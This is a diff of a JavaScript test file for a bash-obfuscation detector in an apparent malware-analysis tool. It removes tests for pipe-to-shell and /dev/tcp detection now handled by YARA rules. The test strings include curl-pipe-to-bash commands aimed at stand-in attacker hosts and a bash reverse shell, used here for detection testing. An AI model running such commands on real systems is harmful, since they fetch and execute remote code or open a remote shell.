@@ -164,17 +164,15 @@ test('bash-obfuscation: B3 printf "%b" decodes second-arg backslash escapes', ()
   void hits;
 });
 
-// ── B4: Pipe-to-shell ───────────────────────────────────────────────────────
-
-test('bash-obfuscation: B4 curl … | sh detection-only candidate emits', () => {
-  const text = 'curl -fsSL https://malicious.example/install.sh | bash';
-  const cands = d._findBashObfuscationCandidates(text, {});
-  const hits = pick(cands, c => /Pipe-to-Shell.*live fetch/.test(c.technique));
-  assert.ok(hits.length >= 1,
-    `expected B4 live-fetch candidate; got: ${JSON.stringify(host(cands))}`);
-  assert.equal(hits[0]._executeOutput, true,
-    'live-fetch candidates must mark _executeOutput for severity bump');
-});
+// ── B4: Pipe-to-shell — live-fetch branch removed in the cull ───────────
+//
+// The "Bash Pipe-to-Shell (live fetch)" branch was deleted from
+// src/decoders/bash-obfuscation.js — it emitted `deobfuscated === raw`
+// and added no cleartext. The YARA rule `Bash_Live_Fetch_Pipe_Shell`
+// in src/rules/script-threats.yar now carries the detection, and the
+// upstream URL flows via the standard IOC.URL extractor. The
+// base64-pipe-to-Shell / xxd-pipe / here-string variants below still
+// do real decoding and remain fully tested.
 
 test('bash-obfuscation: B4 base64-pipe-to-shell decodes upstream payload', () => {
   // 'curl evil | sh' base64 = 'Y3VybCBldmlsIHwgc2g='
@@ -276,14 +274,17 @@ test('bash-obfuscation: B6 IFS reassignment + eval $V resolves with separator', 
   assert.equal(hits[0]._executeOutput, true);
 });
 
-test('bash-obfuscation: B6 IFS without resolved var emits structural candidate', () => {
-  // Even if the var is not literally assigned (e.g. cmd=$(…)),
-  // IFS-tweak + eval $V is high-confidence-malicious by structure.
+test('bash-obfuscation: B6 IFS without resolved var drops (structural branch removed in cull)', () => {
+  // Regression guard for the cull: the former "Bash IFS Reassembly
+  // (structural)" branch emitted a synthetic label when the IFS-piped
+  // var had no literal assignment. That branch was deleted; the YARA
+  // rule `Bash_IFS_Reassembly` now carries the detection. The decoder
+  // must emit ZERO candidates for this unresolved shape.
   const text = `IFS=$'\\x09'; eval $unknownVar`;
   const cands = d._findBashObfuscationCandidates(text, {});
   const hits = pick(cands, c => /IFS Reassembly.*structural/.test(c.technique));
-  assert.ok(hits.length >= 1,
-    `expected structural-only B6 hit; got: ${JSON.stringify(host(cands))}`);
+  assert.equal(hits.length, 0,
+    `IFS Reassembly (structural) must no longer emit; got: ${JSON.stringify(host(cands))}`);
 });
 
 test('bash-obfuscation: B6 var concatenation $a$b$c resolves to command', () => {
@@ -297,17 +298,14 @@ test('bash-obfuscation: B6 var concatenation $a$b$c resolves to command', () => 
   assert.match(hits[0].deobfuscated, /^curl/);
 });
 
-// ── /dev/tcp reverse shell (standalone pattern) ─────────────────────────────
-
-test('bash-obfuscation: /dev/tcp reverse-shell flagged with _executeOutput', () => {
-  // Canonical bash reverse-shell — bash -i + /dev/tcp redirect.
-  const text = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';
-  const cands = d._findBashObfuscationCandidates(text, {});
-  const hits = pick(cands, c => /\/dev\/tcp/.test(c.technique));
-  assert.ok(hits.length >= 1,
-    `expected /dev/tcp hit; got: ${JSON.stringify(host(cands))}`);
-  assert.equal(hits[0]._executeOutput, true);
-});
+// ── /dev/tcp reverse shell — branch removed in the cull ────────────────
+//
+// The "Bash /dev/tcp Reverse Shell" branch was deleted from
+// src/decoders/bash-obfuscation.js — it emitted
+// `"bash /dev/tcp reverse-shell → host:port"` which restated the raw
+// command and added no cleartext. The YARA rule
+// `Bash_DevTcp_Reverse_Shell` in src/rules/script-threats.yar now
+// carries the detection; host:port flow as IOC.IP + IOC.URL.
 
 // ── Empty-input + non-bash-text contract ────────────────────────────────────
 
@@ -320,127 +318,30 @@ test('bash-obfuscation: returns empty for short or non-bash text', () => {
 });
 
 test('bash-obfuscation: caps at maxCandidatesPerType', () => {
-  // Generate a flood of pipe-to-shell patterns; cap should bind.
-  const line = 'curl https://evil.example/x | sh\n';
+  // Generate a flood of base64-pipe-to-shell patterns; cap should bind.
+  // (The live-fetch pipe-to-shell branch was removed in the cull; the
+  // base64-pipe variant still produces real decoded candidates and is
+  // a legitimate cap-check.)
+  const b64 = (typeof Buffer !== 'undefined')
+    ? Buffer.from('id').toString('base64')
+    : 'aWQ=';
+  const line = `echo "${b64}" | base64 -d | sh\n`;
   const flood = line.repeat(d.maxCandidatesPerType + 50);
   const cands = d._findBashObfuscationCandidates(flood, {});
-  const pipes = pick(cands, c => /Pipe-to-Shell/.test(c.technique));
+  const pipes = pick(cands, c => /base64-pipe-to-Shell/.test(c.technique));
   assert.ok(pipes.length <= d.maxCandidatesPerType,
     `expected ≤ ${d.maxCandidatesPerType} candidates, got ${pipes.length}`);
 });
 
-// ── Post-processor regression: CMD `for /f` pattern must not leak ───────────
+// ── Post-processor regression tests (removed in the cull) ──────────────
 //
-// Background: `_executeOutput` started life as a CMD-specific marker
-// for `for /f … do call %X` (b74cd05). c3e94a1 broadened it to
-// "decoded payload is fed back into a shell" across bash / python /
-// php / js decoders. The post-processor in cmd-obfuscation.js
-// previously read `_executeOutput` and unconditionally pushed the
-// CMD-only IOC.PATTERN
-//   "for /f … do call %X — captured command output is executed as a
-//    shell command"
-// onto every family's findings. The regression: bash `curl … | bash`
-// findings showed the CMD `for /f` pattern in the sidebar.
-//
-// The fix splits severity escalation (still `_executeOutput`) from
-// the family-specific IOC.PATTERN text (now `_patternIocs`). These
-// tests pin the new contract.
-
-test('bash-obfuscation: post-processor does NOT attach CMD `for /f` pattern to live-fetch finding', async () => {
-  const text = 'curl -sSL https://evil.example.com?payload=1234 | bash';
-  const cands = d._findBashObfuscationCandidates(text, {});
-  const cand = cands.find(c => /Pipe-to-Shell.*live fetch/.test(c.technique));
-  assert.ok(cand, `expected B4 live-fetch candidate; got: ${JSON.stringify(host(cands))}`);
-  assert.equal(cand._executeOutput, true, 'pre-condition: candidate marks _executeOutput');
-  // Per the split-severity contract, bash-family live-fetch candidates
-  // carry a bash-specific `_patternIocs` entry (the T1105 mirror). The
-  // regression this test guards against is the *CMD* `for /f` mirror
-  // leaking into the bash finding — not the presence of any mirror.
-  const bashMirror = (cand._patternIocs || []).find(p => /pipe-to-shell/i.test(p.url || ''));
-  assert.ok(bashMirror,
-    'bash live-fetch candidate must carry its own T1105 _patternIocs entry');
-  const cmdForFLeak = (cand._patternIocs || []).find(p => /for\s*\/f/i.test(p.url || ''));
-  assert.equal(cmdForFLeak, undefined,
-    'bash live-fetch candidate must NOT carry the CMD `for /f` pattern in _patternIocs');
-
-  const finding = await d._processCommandObfuscation(cand);
-  assert.ok(finding, 'expected post-processor to produce a finding');
-
-  const patternIocs = (finding.iocs || []).filter(i => i.type === IOC.PATTERN);
-  const forFLeak = patternIocs.find(i => /for\s*\/f/i.test(i.url || ''));
-  assert.equal(forFLeak, undefined,
-    `bash candidate must not carry the CMD \`for /f\` pattern; got: ${JSON.stringify(host(patternIocs))}`);
-
-  // The URL IOC from the decoded payload survives into the finding.
-  const urlIoc = (finding.iocs || []).find(
-    i => i.type === IOC.URL && i.url === 'https://evil.example.com?payload=1234'
-  );
-  assert.ok(urlIoc, `expected URL IOC preserved; got: ${JSON.stringify(host(finding.iocs))}`);
-
-  // Severity is bumped per `_executeOutput` semantics. A URL IOC plus
-  // the dangerousPatterns hits (`curl`, `bash`) already push past
-  // the default 'medium' tier; with `_executeOutput` it lands at
-  // 'high' or 'critical'.
-  assert.ok(finding.severity === 'high' || finding.severity === 'critical',
-    `expected severity ≥ high; got ${finding.severity}`);
-});
-
-test('bash-obfuscation: B4 live-fetch candidate sets `deobfuscated === raw` to mark detection-only', () => {
-  // The live-fetch shape isn't deobfuscation; the URL IS the
-  // actionable artefact and is surfaced via `_patternIocs`. Setting
-  // `candidate.deobfuscated` byte-identical to `candidate.raw`
-  // signals the post-processor (`_processCommandObfuscation`) that
-  // this is a detection-only candidate: no tautological encoded-
-  // content card, IOCs routed to `externalRefs` by the host.
-  // Regression pin: previously the decoder synthesised a
-  // `pipe-to-shell upstream: <URL>` breadcrumb that polluted the
-  // sidebar preview and the "Load for analysis" drill-down.
-  const text = 'curl -s http://attacker.com/payload.sh | bash';
-  const cands = d._findBashObfuscationCandidates(text, {});
-  const cand = cands.find(c => /Pipe-to-Shell.*live fetch/.test(c.technique));
-  assert.ok(cand, `expected B4 live-fetch candidate; got: ${JSON.stringify(host(cands))}`);
-  assert.equal(cand.deobfuscated, cand.raw,
-    `B4 live-fetch candidate must set deobfuscated === raw to mark detection-only; got deobfuscated=${JSON.stringify(cand.deobfuscated)}, raw=${JSON.stringify(cand.raw)}`);
-  // Sanity: the legacy synthesised placeholder must never appear.
-  assert.ok(!/pipe-to-shell upstream:/i.test(cand.deobfuscated),
-    'deobfuscated must not contain the legacy "pipe-to-shell upstream:" placeholder');
-});
-
-test('bash-obfuscation: B4 live-fetch _processCommandObfuscation returns _detectionOnly sentinel with URL + T1105 IOCs', async () => {
-  // With `deobfuscated === raw`, `_processCommandObfuscation` returns
-  // a `{ _detectionOnly: true, iocs, severity, … }` sentinel instead
-  // of an `encoded-content` finding. The sentinel carries:
-  //   • an IOC.URL extracted from the raw curl-pipe-bash line; and
-  //   • the T1105 IOC.PATTERN mirror from `_patternIocs`.
-  // The host (`app-load.js`) routes these IOCs to `findings.externalRefs`
-  // and filters the sentinel out of `findings.encodedContent` so no
-  // tautological "Deobfuscation" card is rendered.
-  const text = 'curl -sSL http://evil.example/x.sh | bash';
-  const cands = d._findBashObfuscationCandidates(text, {});
-  const cand = cands.find(c => /Pipe-to-Shell.*live fetch/.test(c.technique));
-  assert.ok(cand, 'expected B4 live-fetch candidate');
-  const finding = await d._processCommandObfuscation(cand);
-  assert.ok(finding, 'expected sentinel finding');
-  assert.equal(finding._detectionOnly, true,
-    `expected _detectionOnly sentinel; got: ${JSON.stringify(Object.keys(finding || {}))}`);
-  // No encoded-content-shaped fields should leak through.
-  assert.equal(finding.type, undefined,
-    'detection-only sentinel must NOT carry an `encoded-content` type');
-  assert.equal(finding._deobfuscatedText, undefined,
-    'detection-only sentinel must NOT carry _deobfuscatedText (no tautological card)');
-  assert.equal(finding.decodedBytes, undefined,
-    'detection-only sentinel must NOT carry decodedBytes (nothing to decode)');
-  assert.equal(finding.canLoad, undefined,
-    'detection-only sentinel must NOT advertise canLoad (no drill-down)');
-  // URL IOC extracted from the raw curl line.
-  const urlIoc = (finding.iocs || []).find(
-    i => i.type === IOC.URL && i.url === 'http://evil.example/x.sh'
-  );
-  assert.ok(urlIoc, `expected URL IOC extracted from raw curl line; got: ${JSON.stringify(finding.iocs)}`);
-  // T1105 mirror from _patternIocs.
-  const patternIoc = (finding.iocs || []).find(
-    i => i.type === IOC.PATTERN && /T1105/i.test(i.url || '')
-  );
-  assert.ok(patternIoc,
-    `expected T1105 IOC.PATTERN mirror from _patternIocs; got: ${JSON.stringify(finding.iocs)}`);
-});
+// Three tests that pinned the `_detectionOnly` sentinel behaviour of
+// the live-fetch `Bash Pipe-to-Shell` candidate were removed here
+// together with the decoder branch. The scenarios they guarded
+// against (the CMD `for /f` pattern leaking into bash findings, the
+// synthesised "pipe-to-shell upstream:" breadcrumb, the detection-
+// only sentinel shape) are no longer reachable — the decoder emits
+// zero candidates for the live-fetch shape, and the YARA rule
+// `Bash_Live_Fetch_Pipe_Shell` is now the single source of truth.
+// The broader `_detectionOnly` sentinel contract is still exercised
+// by other decoder branches (base64-pipe, xxd-pipe, etc.).
